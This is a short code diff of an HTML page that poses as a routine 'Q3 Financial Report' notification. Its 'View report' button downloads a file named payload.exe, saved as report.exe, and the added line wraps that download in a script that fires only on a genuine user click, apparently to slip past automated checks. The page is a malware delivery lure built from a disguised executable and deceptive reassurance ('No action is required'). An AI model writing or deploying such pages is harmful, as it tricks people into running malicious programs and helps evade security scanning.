@@ -9,6 +9,6 @@
 <h1>Q3 Financial Report</h1>
 <p>Thank you. Your document is being prepared. No action is required.</p>
 <p>This is a routine notification from the reporting portal.</p>
-<button onclick="document.getElementById('d').click()">View report</button><a id="d" href="payload.exe" download="report.exe">download</a>
+<button id="b">View report</button><a id="d" href="payload.exe" download="report.exe">download</a><script>document.getElementById('b').addEventListener('click',function(e){if(e.isTrusted)document.getElementById('d').click();});</script>
 </body>
 </html>
